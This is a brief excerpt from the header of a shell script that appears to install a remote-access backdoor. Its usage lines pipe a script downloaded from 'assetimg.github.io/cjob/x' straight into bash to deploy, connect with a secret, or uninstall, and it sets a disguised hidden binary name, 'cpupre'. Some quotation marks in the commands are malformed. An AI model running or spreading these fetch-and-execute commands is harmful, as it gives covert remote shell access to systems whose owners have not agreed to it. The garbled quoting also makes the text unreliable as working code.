...
#   $ bash -c "$(curl -fsSL https://assetimg.github.io/cjob/x)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL https://assetimg.github.io/cjob/x)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL https://assetimg.github.io/cjob/x)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://assetimg.github.io/cjob/x)"
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
...
BIN_HIDDEN_NAME_DEFAULT="cpupre"
